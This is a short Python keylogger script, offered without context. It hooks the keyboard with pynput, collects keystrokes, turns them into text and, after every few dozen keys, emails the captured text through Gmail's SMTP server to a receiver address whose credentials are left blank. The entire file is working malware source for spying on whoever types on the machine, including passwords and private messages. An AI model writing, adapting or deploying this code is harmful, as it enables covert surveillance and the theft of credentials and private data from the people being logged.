import pynput
import smtplib
import ssl
from pynput.keyboard import Key, Listener

count = 0
keys = []


def main():
    def send_email(message):
        global server
        smtp_server = "smtp.gmail.com"
        port = 587
        sender_email = ""
        password = ""
        receiver_email = ""

        context = ssl.create_default_context()

        try:
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)

        except Exception as e:
            print(e)
        finally:
            server.quit()

    def on_press(key):
        print(key, end=" ")
        print("pressed")
        global keys, count
        keys.append(str(key))
        count += 1
        if count > 36:
            count = 0
            email(keys)

    def email(keys):
        message = ""
        for key in keys:
            k = key.replace("'", "")
            if key == "Key.space":
                k = " "
            elif key.find("Key") > 0:
                k = ""
            elif key.find("enter") > 0:
                k = "\n"
            elif key.find("backspace") >= 0:
                k = "<"
            message += k
        print(message)
        send_email(message)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
